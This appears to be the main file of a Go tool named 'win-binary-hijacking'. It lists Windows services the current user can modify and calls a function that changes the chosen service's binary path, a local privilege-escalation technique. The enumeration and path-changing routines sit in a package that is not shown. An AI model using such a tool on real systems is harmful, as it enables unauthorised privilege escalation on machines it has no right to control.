package main

import (
	"fmt"

	"github.com/Luke5080/win-binary-hijacking/internal/enumwin"
)

func main() {

	// Slice holding of type *enum.WeakServ to display
	// choice of services that are exploitable to the user.
	var userOptions []*enumwin.WeakServ

	var userChoice int

	fmt.Println("HIJACKED!")

	chanBack := enumwin.EnumServ()

	// Itterate through values in returned channel
	// and append them to the userOptions slice
	for val := range chanBack {
		userOptions = append(userOptions, val)
	}

	if len(userOptions) > 0 {
		fmt.Println("Can Modify the following services:")

		// Display each entry in the userOptions slice
		// as well as their index to provide menu of
		// options for the user
		for index, val := range userOptions {
			fmt.Println(index+1, val.Name)
		}

		fmt.Println("Choose a service to modify:")

		r, err := fmt.Scanln(&userChoice)

		// Error handling for user choice input
		// Personal Notes: Scanln returns number of
		// succesfully read arguments and err
		// If arguments read = 0 or err != nil
		// Ask for input again. Similarily, if
		// user choice is not an index of the
		// the the userOptions slice, ask again
		for r != 1 || err != nil || userChoice > len(userOptions) || userChoice <= 0 {
			r, err = fmt.Scanln(&userChoice)
		}

		enumwin.ChangeBinPath(userOptions[userChoice-1])

	} else {
		fmt.Println("No services found which you can modify")
	}

}
